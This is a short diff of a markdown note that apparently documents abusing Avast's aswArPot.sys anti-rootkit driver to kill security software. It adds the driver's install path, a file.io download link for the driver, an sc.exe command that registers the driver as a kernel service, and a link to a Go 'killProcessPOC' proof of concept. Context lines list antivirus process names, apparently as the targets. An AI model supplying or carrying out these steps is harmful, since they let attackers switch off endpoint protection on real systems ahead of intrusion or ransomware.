@@ -13,6 +13,19 @@ CVE-2021-40539
 Avast download  
 https://archive.org/details/avast_free_antivirus_setup_offline_202010  
 
+Path after install of 20.8.2432  
+```  
+C:\Program Files\Avast Software\Avast\setup\Inf\x64\aswArPot.sys
+```  
+
+aswArPot.sys  
+https://file.io/FJbxjNwn10Jk  
+
+Create service  
+```  
+sc.exe create aswSP_ArPot2 binPath= C:\<Path to driver>\aswArPot.sys type= kernel
+```  
+
 POC - https://github.com/timwhitez/killProcessPOC/blob/main/aswarpot.go  
 ```  
 package main
@@ -203,12 +216,3 @@ sophosfs.exe
 avwrapper.exe
 ```  
 
-Create service  
-```  
-sc.exe create aswSP_ArPot2 binPath= C:\<Path to driver>\aswArPot.sys type= kernel
-```  
-
-Path after install of 20.8.2432  
-```  
-C:\Program Files\Avast Software\Avast\setup\Inf\x64\aswArPot.sys
-```  
